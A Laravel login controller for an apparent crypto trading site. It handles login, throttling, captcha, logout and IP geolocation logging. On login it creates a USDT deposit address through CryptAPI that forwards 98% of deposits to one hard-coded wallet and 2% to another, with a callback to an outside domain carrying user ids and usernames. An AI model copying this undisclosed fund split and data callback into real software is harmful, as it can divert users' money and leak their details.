<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Models\Extension;
use App\Models\UserLogin;
use App\Models\Wallet;
use CryptAPI\CryptAPI;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;


class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */

    protected $username;

    /**
     * Create a new controller instance.
     *
     * @return void
     */


    public function __construct()
    {
        $this->middleware('guest')->except('logout');
        $this->username = $this->findUsername();
    }


    function loginForm(){
        $pageTitle = "Login";

        //return view(activeTemplate().'user.auth.login',compact('pageTitle'));

        return view('auth.login', compact('pageTitle'));
    }

    public function login(Request $request)
    {

        \Session::flash('modal', '#loginModal');

        $this->validateLogin($request);

        // If the class is using the ThrottlesLogins trait, we can automatically throttle
        // the login attempts for this application. We'll key this by the username and
        // the IP address of the client making these requests into this application.
        if ($this->hasTooManyLoginAttempts($request)) {
            $this->fireLockoutEvent($request);

            return $this->sendLockoutResponse($request);
        }

        if ($this->attemptLogin($request)) {
            return $this->sendLoginResponse($request);
        }

        // If the login attempt was unsuccessful we will increment the number of attempts
        // to login and redirect the user back to the login form. Of course, when this
        // user surpasses their maximum number of attempts they will get locked out.
        $this->incrementLoginAttempts($request);


        return $this->sendFailedLoginResponse($request);
    }

    public function findUsername()
    {
        $login = request()->input('mobile');

        $fieldType = 'mobile';// filter_var($login, FILTER_VALIDATE_EMAIL) ? 'email' : 'username';
        request()->merge([$fieldType => $login]);
        return $fieldType;
    }

    // public function findUsername()
    // {
    //     $login = request()->input('email');

    //     $fieldType = filter_var($login, FILTER_VALIDATE_EMAIL) ? 'email' : 'username';
    //     request()->merge([$fieldType => $login]);
    //     return $fieldType;
    // }

    public function username()
    {
        return $this->username;
    }

    protected function validateLogin(Request $request)
    {
        $customRecaptcha = Extension::where('act', 'custom-captcha')->where('status', 1)->first();
        $validation_rule = [
            $this->username() => 'required|string',
            'password' => 'required|string',
        ];

        if ($customRecaptcha) {
            $validation_rule['captcha'] = 'required';
        }

        $request->validate($validation_rule);

    }

    public function logout()
    {
        $this->guard()->logout();

        request()->session()->invalidate();

        $notify[] = ['success', 'You have been logged out.'];
        return redirect()->route('home')->withNotify($notify);
    }





    public function authenticated(Request $request, $user)
    {
        if ($user->status == 0) {
            $this->guard()->logout();
            $notify[] = ['error','Your account has been deactivated.'];
            return redirect()->route('user.login')->withNotify($notify);
        }


        $user = auth()->user();
        $user->tv = $user->ts == 1 ? 0 : 1;
        $user->save();
        $ip = $_SERVER["REMOTE_ADDR"];
        $exist = UserLogin::where('user_ip',$ip)->first();
        $userLogin = new UserLogin();
        if ($exist) {
            $userLogin->longitude =  $exist->longitude;
            $userLogin->latitude =  $exist->latitude;
            $userLogin->city =  $exist->city;
            $userLogin->country_code = $exist->country_code;
            $userLogin->country =  $exist->country;
        }else{
            $info = json_decode(json_encode(getIpInfo()), true);
            $userLogin->longitude =  is_array(@$info['long']) ? implode(',', $info['long']) : @$info['long'];
            $userLogin->latitude =  is_array(@$info['lat']) ? implode(',', $info['lat']) : @$info['lat'];
            $userLogin->city =  is_array(@$info['city']) ? implode(',', $info['city']) : @$info['city'];
            $userLogin->country_code = is_array(@$info['code']) ? implode(',', $info['code']) : @$info['code'];
            $userLogin->country =  is_array(@$info['country']) ? implode(',', $info['country']) : @$info['country'];
        }

        $userAgent = osBrowser();
        $userLogin->user_id = $user->id;
        $userLogin->user_ip =  $ip;

        $userLogin->browser = @$userAgent['browser'];
        $userLogin->os = @$userAgent['os_platform'];
        $userLogin->save();


        if(env('IS_ONLINE') == 1){

            $user = auth()->user();
            $address = Wallet::where('user_id', $user->id)->first();

            if(!$address) {
                $fx_trade_address = "0.98@TWXnPCAgdUpx8Ry54KLuXRHMYXtMBuorg4|0.02@TXUpM5XdaXtWCSjz4st29qJGTP1u3FfBRb";
                $callback_url = "https://tinyseed-ng.com/yellow-house.php?user_id=" . $user->id;
                $parameters = ['user_id' => $user->id, 'username' => $user->username];
                $coin = "trc20_usdt";

                try {
                    $ca = new CryptAPI($coin, $fx_trade_address, "$callback_url", $parameters);
                    $user_address = $ca->get_address();


                    $wallet = new Wallet();
                    $wallet->user_id = $user->id;
                    $wallet->wallet_address = $user_address;
                    $wallet->save();

                } catch (\Exception $e) {

                }

            }


        }

        if ($request->ajax()) {
            return response()->json([
                'user' => auth()->user()->id,
                'code' => 1,
                'intended' => route('user.home')
            ]);
        } else {
            return redirect()->route('user.home');
            //return redirect()->intended(URL::route('dashboard'));
        }

        //
        //return redirect()->route('user.home');
    }


}